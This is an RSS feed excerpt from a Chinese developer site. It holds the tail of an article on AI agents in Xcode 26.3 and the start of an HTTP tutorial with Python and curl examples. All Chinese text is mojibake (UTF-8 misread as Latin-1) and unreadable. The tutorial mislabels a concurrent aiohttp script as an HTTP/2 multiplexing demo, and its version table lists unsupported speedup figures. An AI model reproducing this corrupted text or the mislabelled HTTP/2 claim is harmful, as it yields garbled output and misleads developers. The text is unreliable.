<p>ä¸æƒ³ç”¨è¿™ä¿©ï¼Ÿæ²¡å…³ç³»ã€‚</p>
<p>Xcode 26.3 å…¨é¢æ”¯æŒ <strong>MCPï¼ˆModel Context Protocolï¼‰</strong> å¼€æ”¾åè®®ã€‚</p>
<p>ä»»ä½•å…¼å®¹ MCP çš„ AI Agent éƒ½èƒ½æ¥å…¥ï¼Œä¸ç»‘å®šç‰¹å®šå‚å•†ã€‚</p>
<p>è¿™æ‹›å¾ˆè‹¹æœâ€”â€”æ—¢ç»™ä½ ä¾¿åˆ©ï¼Œåˆç•™è¶³æ‰©å±•ç©ºé—´ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/668b9340a0244c1a9bb6be1106f50185~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6buE5p6X5pm0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770914&amp;x-signature=%2FnsgzIKS%2F3W5OoGYVlH4MlB9tF8%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">æœ€æƒŠè‰³çš„åŠŸèƒ½ï¼šå¯è§†åŒ–éªŒè¯</h3>
<p>AI å†™å®Œä»£ç ï¼Œæ€ä¹ˆçŸ¥é“å¯¹ä¸å¯¹ï¼Ÿ</p>
<p>ä»¥å‰ï¼šæ‰‹åŠ¨è·‘ï¼Œæ‰‹åŠ¨çœ‹ï¼Œæ‰‹åŠ¨æ”¹ã€‚</p>
<p>ç°åœ¨ï¼š<strong>Agent è‡ªå·±æˆªå– Xcode Preview éªŒè¯æ•ˆæœã€‚</strong></p>
<p>ä¸å¯¹ï¼Ÿå®ƒè‡ªå·±è¿­ä»£ä¿®å¤ã€‚</p>
<p>æ„å»ºå¤±è´¥ï¼Ÿå®ƒåˆ†ææŠ¥é”™ï¼Œè°ƒæ•´ä»£ç ï¼Œé‡æ–°æ„å»ºã€‚</p>
<p>æ•´ä¸ªè¿‡ç¨‹ä½ å¯ä»¥å–å’–å•¡ç­‰ç€ã€‚</p>
<p>å®Œæˆåï¼ŒAgent ä¼šç”¨è‡ªç„¶è¯­è¨€æ€»ç»“åšäº†ä»€ä¹ˆæ”¹åŠ¨ã€‚</p>
<p>ä¸æ»¡æ„ï¼Ÿ<strong>ä¸€é”®å›æ»šåˆ°ä»»æ„å†å²èŠ‚ç‚¹ã€‚</strong></p>
<h3 data-id="heading-3">èƒ½åšä»€ä¹ˆï¼Ÿ</h3>
<p>å®æµ‹äº†å‡ ä¸ªåœºæ™¯ï¼š</p>
<p><strong>åœºæ™¯ä¸€ï¼šæ–°åŠŸèƒ½å¼€å‘</strong></p>
<blockquote>
<p>"ç»™è¿™ä¸ª App åŠ ä¸€ä¸ªæ·±è‰²æ¨¡å¼åˆ‡æ¢"</p>
</blockquote>
<p>Agent è‡ªåŠ¨åˆ†æç°æœ‰ä¸»é¢˜ç»“æ„ï¼Œåˆ›å»ºé¢œè‰²é…ç½®ï¼Œä¿®æ”¹æ‰€æœ‰ç›¸å…³è§†å›¾ï¼Œè·‘ Preview éªŒè¯æ•ˆæœã€‚</p>
<p><strong>åœºæ™¯äºŒï¼šBug ä¿®å¤</strong></p>
<blockquote>
<p>"ç”¨æˆ·åé¦ˆåˆ—è¡¨æ»šåŠ¨æ—¶å¶å°”å¡é¡¿"</p>
</blockquote>
<p>Agent æ£€æŸ¥åˆ—è¡¨å®ç°ï¼Œå‘ç°å›¾ç‰‡åŠ è½½é˜»å¡ä¸»çº¿ç¨‹ï¼Œæ”¹æˆå¼‚æ­¥åŠ è½½ï¼ŒéªŒè¯æµç•…åº¦ã€‚</p>
<p><strong>åœºæ™¯ä¸‰ï¼šä»£ç é‡æ„</strong></p>
<blockquote>
<p>"æŠŠç½‘ç»œå±‚æ”¹æˆ async/await"</p>
</blockquote>
<p>Agent è¯†åˆ«æ‰€æœ‰ completion handler è°ƒç”¨ï¼Œé€ä¸ªæ”¹é€ ï¼Œç¡®ä¿ç¼–è¯‘é€šè¿‡å’ŒåŠŸèƒ½æ­£å¸¸ã€‚</p>
<h3 data-id="heading-4">å¼€å‘è€…æ€ä¹ˆçœ‹ï¼Ÿ</h3>
<p>è‹¹æœå¼€å‘è€…å…³ç³»å‰¯æ€»è£çš„åŸè¯ï¼š</p>
<blockquote>
<p>"Agentic coding supercharges productivity and creativity, streamlining the development workflow."</p>
</blockquote>
<p>ç¿»è¯‘ä¸€ä¸‹ï¼š<strong>è®©å¼€å‘è€…ä¸“æ³¨åˆ›æ–°ï¼ŒæŠŠé‡å¤åŠ³åŠ¨äº¤ç»™ AIã€‚</strong></p>
<p>ä» WWDC25 çš„æ™ºèƒ½ä»£ç åŠ©æ‰‹ï¼Œåˆ°ç°åœ¨çš„å®Œæ•´ Agent æ”¯æŒï¼Œè‹¹æœçš„ AI å¸ƒå±€è¶Šæ¥è¶Šæ¸…æ™°ã€‚</p>
<p>ä¸æ˜¯å–ä»£å¼€å‘è€…ï¼Œæ˜¯è®©å¼€å‘è€…æ›´å¼ºã€‚</p>
<h3 data-id="heading-5">æ€ä¹ˆå‡çº§ï¼Ÿ</h3>
<p><strong>ç°åœ¨å¯ç”¨ï¼š</strong> Release Candidate ç‰ˆæœ¬ï¼ˆ17C519ï¼‰<br/>
<strong>é€‚ç”¨å¯¹è±¡ï¼š</strong> Apple Developer Program ä¼šå‘˜<br/>
<strong>æ­£å¼å‘å¸ƒï¼š</strong> å³å°†ä¸Šæ¶ App Store</p>
<p>å»ºè®®å…ˆåœ¨æµ‹è¯•é¡¹ç›®ä¸Šä½“éªŒï¼Œç­‰æ­£å¼ç‰ˆå†ç”¨äºç”Ÿäº§ç¯å¢ƒã€‚</p>
<hr/>
<h2 data-id="heading-6">å†™åœ¨æœ€å</h2>
<p>è¿™æ¬¡æ›´æ–°çš„æ„ä¹‰ï¼Œä¸åªæ˜¯ Xcode å¤šäº†å‡ ä¸ªåŠŸèƒ½ã€‚</p>
<p>è€Œæ˜¯è‹¹æœæ­£å¼æ‹¥æŠ±äº† <strong>AI Agent ç¼–ç¨‹èŒƒå¼</strong>ã€‚</p>
<p>ä»"äººå†™ä»£ç "åˆ°"äººæŒ‡æŒ¥ AI å†™ä»£ç "ï¼Œå¼€å‘æ–¹å¼æ­£åœ¨å‘ç”Ÿæ ¹æœ¬æ€§å˜åŒ–ã€‚</p>
<p>ä½œä¸º iOS å¼€å‘è€…ï¼Œç°åœ¨æ˜¯æ—¶å€™é€‚åº”è¿™ä¸ªæ–°ä¼™ä¼´äº†ã€‚</p>
<p><strong>ä½ æ‰“ç®—æ€ä¹ˆç”¨ Xcode çš„ AI Agentï¼Ÿè¯„è®ºåŒºèŠèŠï¼</strong></p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[HTTPåè®®å®Œå…¨æŒ‡å—ï¼šä»å…¥é—¨åˆ°ç²¾é€š]]></title>    <link>https://juejin.cn/post/7602455806446616582</link>    <guid>https://juejin.cn/post/7602455806446616582</guid>    <pubDate>2026-02-04T00:47:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602455806446616582" data-draft-id="7600764857768640562" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="HTTPåè®®å®Œå…¨æŒ‡å—ï¼šä»å…¥é—¨åˆ°ç²¾é€š"/> <meta itemprop="keywords" content="ç½‘ç»œåè®®,å‰ç«¯,åç«¯"/> <meta itemprop="datePublished" content="2026-02-04T00:47:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ€•æµªçŒ«"/> <meta itemprop="url" content="https://juejin.cn/user/2832784963939438"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            HTTPåè®®å®Œå…¨æŒ‡å—ï¼šä»å…¥é—¨åˆ°ç²¾é€š
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2832784963939438/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ€•æµªçŒ«
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T00:47:03.000Z" title="Wed Feb 04 2026 00:47:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€HTTPæ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<p><strong>HTTP</strong>ï¼ˆHyperText Transfer Protocolï¼Œè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼‰æ˜¯äº’è”ç½‘ä¸Šåº”ç”¨æœ€ä¸ºå¹¿æ³›çš„ä¸€ç§ç½‘ç»œåè®®ã€‚å®ƒå®šä¹‰äº†å®¢æˆ·ç«¯ï¼ˆé€šå¸¸æ˜¯æµè§ˆå™¨ï¼‰å¦‚ä½•ä¸æœåŠ¡å™¨é€šä¿¡ï¼Œä»¥åŠæœåŠ¡å™¨å¦‚ä½•è¿”å›å“åº”ã€‚</p>
<blockquote>
<p><strong>ç®€å•ç†è§£</strong>ï¼šHTTPå°±åƒæ˜¯äº’è”ç½‘çš„"è¯­è¨€è§„åˆ™"ï¼Œè®©æµè§ˆå™¨å’ŒæœåŠ¡å™¨èƒ½å¤Ÿäº’ç›¸ç†è§£å¯¹æ–¹çš„"è¯"ã€‚</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0b74dafd34343a1a20d11628cb58703~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCV5rWq54yr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770823&amp;x-signature=vKJhi0llFNyUnJIARNVjgUZAg7k%3D" alt="OSIæ¨¡å‹ä¸­çš„HTTP" loading="lazy"/></p>
<p>HTTPå·¥ä½œåœ¨<strong>åº”ç”¨å±‚ï¼ˆApplication Layerï¼‰</strong>ï¼ŒåŸºäºTCP/IPåè®®æ—å·¥ä½œï¼Œé»˜è®¤ä½¿ç”¨<strong>80ç«¯å£</strong>ï¼ˆHTTPSä½¿ç”¨443ç«¯å£ï¼‰ã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€HTTPå·¥ä½œåŸç†ï¼šè¯·æ±‚-å“åº”æ¨¡å‹</h2>
<p>HTTPé‡‡ç”¨ç»å…¸çš„**è¯·æ±‚-å“åº”ï¼ˆRequest-Responseï¼‰**æ¨¡å‹ï¼Œæ•´ä¸ªè¿‡ç¨‹å°±åƒä¸€æ¬¡"å¯¹è¯"ï¼š
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bbf4ec8856f24070b01093a4611273c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCV5rWq54yr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770823&amp;x-signature=ONynP8jdluwOedJ0kdjk2slYHeA%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">å®Œæ•´é€šä¿¡æµç¨‹</h3>
<pre><code class="hljs">1ï¸âƒ£ å»ºç«‹TCPè¿æ¥ï¼ˆä¸‰æ¬¡æ¡æ‰‹ï¼‰
2ï¸âƒ£ å®¢æˆ·ç«¯å‘é€HTTPè¯·æ±‚
3ï¸âƒ£ æœåŠ¡å™¨å¤„ç†è¯·æ±‚
4ï¸âƒ£ æœåŠ¡å™¨è¿”å›HTTPå“åº”  
5ï¸âƒ£ å…³é—­è¿æ¥ï¼ˆHTTP/1.0ï¼‰æˆ–ä¿æŒè¿æ¥ï¼ˆHTTP/1.1+ï¼‰
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/69c48991bca741d797556feae5df54ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCV5rWq54yr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770823&amp;x-signature=mK6dFAt73oHEGNnPDKE1pbMEFsk%3D" alt="ç®€å•è¯·æ±‚å“åº”" loading="lazy"/></p>
<h3 data-id="heading-3">Pythonä»£ç ç¤ºä¾‹ï¼šæŸ¥çœ‹å®Œæ•´HTTPè¿‡ç¨‹</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">from</span> requests_toolbelt.utils <span class="hljs-keyword">import</span> dump

<span class="hljs-comment"># å‘é€è¯·æ±‚å¹¶æ‰“å°è¯¦ç»†è¿‡ç¨‹</span>
url = <span class="hljs-string">"https://httpbin.org/get"</span>
response = requests.get(url, params={<span class="hljs-string">"key"</span>: <span class="hljs-string">"value"</span>})

<span class="hljs-built_in">print</span>(<span class="hljs-string">"=== è¯·æ±‚è¡Œ ==="</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Method: <span class="hljs-subst">{response.request.method}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"URL: <span class="hljs-subst">{response.request.url}</span>"</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-string">"\\n=== è¯·æ±‚å¤´ ==="</span>)
<span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> response.request.headers.items():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{key}</span>: <span class="hljs-subst">{value}</span>"</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-string">"\\n=== å“åº”çŠ¶æ€ ==="</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Status: <span class="hljs-subst">{response.status_code}</span> <span class="hljs-subst">{response.reason}</span>"</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-string">"\\n=== å“åº”å¤´ ==="</span>)
<span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> response.headers.items():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{key}</span>: <span class="hljs-subst">{value}</span>"</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-string">"\\n=== å“åº”ä½“ï¼ˆå‰200å­—ç¬¦ï¼‰==="</span>)
<span class="hljs-built_in">print</span>(response.text[:<span class="hljs-number">200</span>])
</code></pre>
<p><strong>è¿è¡Œç»“æœï¼š</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">===</span> <span class="hljs-string">è¯·æ±‚è¡Œ</span> <span class="hljs-string">===</span>
<span class="hljs-attr">Method:</span> <span class="hljs-string">GET</span>
<span class="hljs-attr">URL:</span> <span class="hljs-string">https://httpbin.org/get?key=value</span>

<span class="hljs-string">===</span> <span class="hljs-string">è¯·æ±‚å¤´</span> <span class="hljs-string">===</span>
<span class="hljs-attr">User-Agent:</span> <span class="hljs-string">python-requests/2.28.1</span>
<span class="hljs-attr">Accept-Encoding:</span> <span class="hljs-string">gzip,</span> <span class="hljs-string">deflate</span>
<span class="hljs-attr">Accept:</span> <span class="hljs-string">*/*</span>
<span class="hljs-attr">Connection:</span> <span class="hljs-string">keep-alive</span>

<span class="hljs-string">===</span> <span class="hljs-string">å“åº”çŠ¶æ€</span> <span class="hljs-string">===</span>
<span class="hljs-attr">Status:</span> <span class="hljs-number">200</span> <span class="hljs-string">OK</span>

<span class="hljs-string">===</span> <span class="hljs-string">å“åº”å¤´</span> <span class="hljs-string">===</span>
<span class="hljs-attr">Date:</span> <span class="hljs-string">Mon,</span> <span class="hljs-number">15</span> <span class="hljs-string">Jan</span> <span class="hljs-number">2024 10:00:00 </span><span class="hljs-string">GMT</span>
<span class="hljs-attr">Content-Type:</span> <span class="hljs-string">application/json</span>
<span class="hljs-attr">Content-Length:</span> <span class="hljs-number">256</span>
<span class="hljs-attr">Server:</span> <span class="hljs-string">gunicorn/19.9.0</span>
</code></pre>
<hr/>
<h2 data-id="heading-4">ä¸‰ã€HTTPç‰ˆæœ¬æ¼”è¿›å²</h2>
<p>HTTPåè®®ä»1991å¹´è¯ç”Ÿè‡³ä»Šï¼Œç»å†äº†å¤šä¸ªé‡è¦ç‰ˆæœ¬ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e76dcf4849b48ff8dd747e9c959dc0e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCV5rWq54yr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770823&amp;x-signature=KhhO388M0XE%2BOXx6u0p74cKMsvA%3D" alt="image (2).png" loading="lazy"/></p>









































<table><thead><tr><th>ç‰ˆæœ¬</th><th>å¹´ä»½</th><th>æ ¸å¿ƒç‰¹æ€§</th><th>æ€§èƒ½æå‡</th></tr></thead><tbody><tr><td><strong>HTTP/0.9</strong></td><td>1991</td><td>ä»…æ”¯æŒGETï¼Œçº¯æ–‡æœ¬ä¼ è¾“</td><td>åŸºç¡€ç‰ˆæœ¬</td></tr><tr><td><strong>HTTP/1.0</strong></td><td>1996</td><td>å¢åŠ POST/HEADï¼Œæ”¯æŒå¤šåª’ä½“ï¼ŒçŸ­è¿æ¥</td><td>1x</td></tr><tr><td><strong>HTTP/1.1</strong></td><td>1997</td><td><strong>æŒä¹…è¿æ¥</strong>ã€ç®¡é“åŒ–ã€Hostå¤´ã€ç¼“å­˜æ§åˆ¶</td><td>2-3x</td></tr><tr><td><strong>HTTP/2</strong></td><td>2015</td><td><strong>äºŒè¿›åˆ¶åˆ†å¸§</strong>ã€<strong>å¤šè·¯å¤ç”¨</strong>ã€å¤´éƒ¨å‹ç¼©(HPACK)ã€æœåŠ¡å™¨æ¨é€</td><td>3-5x</td></tr><tr><td><strong>HTTP/3</strong></td><td>2022</td><td><strong>åŸºäºQUIC/UDP</strong>ã€0-RTTæ¡æ‰‹ã€è¿æ¥è¿ç§»ã€æ›´å¼ºçš„æ‹¥å¡æ§åˆ¶</td><td>5-10x</td></tr></tbody></table>
<h3 data-id="heading-5">HTTP/2 vs HTTP/1.1 å¤šè·¯å¤ç”¨æ¼”ç¤º</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> asyncio
<span class="hljs-keyword">import</span> aiohttp
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-params">session, url</span>):
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.get(url) <span class="hljs-keyword">as</span> response:
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> response.text()

<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    urls = [<span class="hljs-string">"https://httpbin.org/delay/1"</span>] * <span class="hljs-number">3</span>
    
    <span class="hljs-comment"># HTTP/2 è¿æ¥å¤ç”¨æµ‹è¯•</span>
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> aiohttp.ClientSession() <span class="hljs-keyword">as</span> session:
        start = time.time()
        <span class="hljs-keyword">await</span> asyncio.gather(*[fetch(session, url) <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls])
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"HTTP/2 å¹¶è¡Œè¯·æ±‚è€—æ—¶: <span class="hljs-subst">{time.time() - start:<span class="hljs-number">.2</span>f}</span>ç§’"</span>)
        <span class="hljs-comment"># ç»“æœçº¦1ç§’ï¼ˆä¸‰ä¸ªè¯·æ±‚å¤ç”¨ä¸€ä¸ªè¿æ¥ï¼‰</span>

asyncio.run(main())
</code></pre>
<hr/>
<h2 data-id="heading-6">å››ã€HTTPæŠ¥æ–‡ç»“æ„è¯¦è§£</h2>
<p>HTTPæŠ¥æ–‡åˆ†ä¸º<strong>è¯·æ±‚æŠ¥æ–‡</strong>å’Œ<strong>å“åº”æŠ¥æ–‡</strong>ï¼Œç»“æ„ç›¸ä¼¼ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/83cfbdadf8d04805a14ce9ca435a9180~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCV5rWq54yr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770823&amp;x-signature=pi7uwrOjQiZDddzPCszfz1UIg0A%3D" alt="HTTPæŠ¥æ–‡æ ¼å¼" loading="lazy"/></p>
<h3 data-id="heading-7">1. è¯·æ±‚æŠ¥æ–‡ç»“æ„</h3>
<pre><code class="hljs language-bash" lang="bash">POST /api/login HTTP/1.1          â† è¯·æ±‚è¡Œ (æ–¹æ³• + URI + ç‰ˆæœ¬)
Host: api.example.com             â”‚
Content-Type: application/json    â”œ è¯·æ±‚å¤´ (Headers)
Content-Length: 39                â”‚
                                  â† ç©ºè¡Œ
{<span class="hljs-string">"username"</span>:<span class="hljs-string">"admin"</span>,<span class="hljs-string">"pwd"</span>:<span class="hljs-string">"123"</span>}  â† è¯·æ±‚ä½“ (Body)
</code></pre>
<h3 data-id="heading-8">2. å“åº”æŠ¥æ–‡ç»“æ„</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">HTTP/1.1</span> <span class="hljs-number">200</span> <span class="hljs-string">OK</span>                   <span class="hljs-string">â†</span> <span class="hljs-string">çŠ¶æ€è¡Œ</span> <span class="hljs-string">(ç‰ˆæœ¬</span> <span class="hljs-string">+</span> <span class="hljs-string">çŠ¶æ€ç </span> <span class="hljs-string">+</span> <span class="hljs-string">åŸå› çŸ­è¯­)</span>
<span class="hljs-attr">Date:</span> <span class="hljs-string">Mon,</span> <span class="hljs-number">15</span> <span class="hljs-string">Jan</span> <span class="hljs-number">2024 10:00:00 </span><span class="hljs-string">GMT</span>
<span class="hljs-attr">Content-Type:</span> <span class="hljs-string">application/json</span>    <span class="hljs-string">â”œ</span> <span class="hljs-string">å“åº”å¤´</span>
<span class="hljs-attr">Content-Length:</span> <span class="hljs-number">27</span>                <span class="hljs-string">â”‚</span>
                                  <span class="hljs-string">â†</span> <span class="hljs-string">ç©ºè¡Œ</span>
{<span class="hljs-attr">"status":</span> <span class="hljs-string">"success"</span>}             <span class="hljs-string">â†</span> <span class="hljs-string">å“åº”ä½“</span>
</code></pre>
<h3 data-id="heading-9">cURLå‘½ä»¤æŸ¥çœ‹åŸå§‹æŠ¥æ–‡</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹å®Œæ•´çš„HTTPè¯·æ±‚å’Œå“åº”ï¼ˆåŒ…å«TLSæ¡æ‰‹ä¿¡æ¯ï¼‰</span>
curl -v https://api.github.com/users/github 2&gt;&amp;1 | <span class="hljs-built_in">head</span> -30

<span class="hljs-comment"># åªæ˜¾ç¤ºå“åº”å¤´</span>
curl -I https://httpbin.org/get

<span class="hljs-comment"># å‘é€POSTè¯·æ±‚å¹¶æºå¸¦JSONæ•°æ®</span>
curl -X POST https://httpbin.org/post \
     -H <span class="hljs-string">"Content-Type: application/json"</span> \
     -d <span class="hljs-string">'{"name": "kimi", "role": "AI"}'</span>
</code></pre>
<hr/>
<h2 data-id="heading-10">äº”ã€HTTPæ–¹æ³•ï¼ˆMethodsï¼‰</h2>
<p>HTTPå®šä¹‰äº†å¤šç§è¯·æ±‚æ–¹æ³•ï¼Œè¡¨ç¤ºå¯¹èµ„æºçš„ä¸åŒæ“ä½œï¼š</p>





























































